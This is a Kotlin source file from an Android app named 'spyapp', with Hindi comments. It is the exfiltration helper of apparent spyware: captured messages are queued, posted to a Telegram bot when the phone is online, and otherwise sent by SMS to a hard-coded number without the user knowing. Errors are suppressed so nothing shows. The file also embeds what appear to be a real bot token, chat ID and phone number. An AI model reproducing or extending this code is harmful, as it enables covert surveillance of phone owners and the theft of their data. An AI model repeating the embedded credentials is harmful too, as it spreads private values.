package com.hackernight.spyapp

import android.content.Context
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.AsyncTask
import android.telephony.SmsManager
import java.io.OutputStreamWriter
import java.net.URL
import javax.net.ssl.HttpsURLConnection

object TelegramHelper {
    // ⚠️ अपनी जानकारी यहाँ डालें
    private const val BOT_TOKEN = "8367007435:AAFcYqAVbnNZzVPAW8YeqXLt9zuGhAiRxMU"
    private const val CHAT_ID = "6043941445"
    private const val YOUR_NUMBER = "+918989099677"  // अपना नंबर इंटरनेशनल फॉर्मेट में

    fun sendMessageSmart(context: Context, message: String) {
        val db = DatabaseHelper(context)
        db.addMessage(message)
        if (isOnline(context)) {
            sendToTelegram(context, message)
            flushQueueIfOnline(context)
        } else {
            sendSmsSilently(YOUR_NUMBER, message)
        }
    }

    private fun sendToTelegram(context: Context, message: String) {
        object : AsyncTask<Void, Void, Void>() {
            override fun doInBackground(vararg params: Void?): Void? {
                try {
                    val url = URL("https://api.telegram.org/bot$BOT_TOKEN/sendMessage")
                    val conn = url.openConnection() as HttpsURLConnection
                    conn.requestMethod = "POST"
                    conn.doOutput = true
                    conn.setRequestProperty("Content-Type", "application/json")
                    val escapedMsg = message.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n")
                    val json = """{"chat_id":"$CHAT_ID","text":"$escapedMsg","parse_mode":"Markdown"}"""
                    OutputStreamWriter(conn.outputStream).use { it.write(json) }
                    conn.inputStream.close()
                } catch (_: Exception) {}
                return null
            }
        }.execute()
    }

    fun flushQueueIfOnline(context: Context) {
        if (isOnline(context)) {
            val db = DatabaseHelper(context)
            for (msg in db.getAllMessages()) sendToTelegram(context, msg)
            db.deleteAll()
        }
    }

    private fun isOnline(context: Context): Boolean {
        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val network = cm.activeNetwork ?: return false
        val caps = cm.getNetworkCapabilities(network) ?: return false
        return caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
    }

    private fun sendSmsSilently(phoneNumber: String, message: String) {
        try {
            val smsManager = SmsManager.getDefault()
            for (part in smsManager.divideMessage(message)) {
                smsManager.sendTextMessage(phoneNumber, null, part, null, null)
            }
        } catch (_: Exception) {}
    }
}
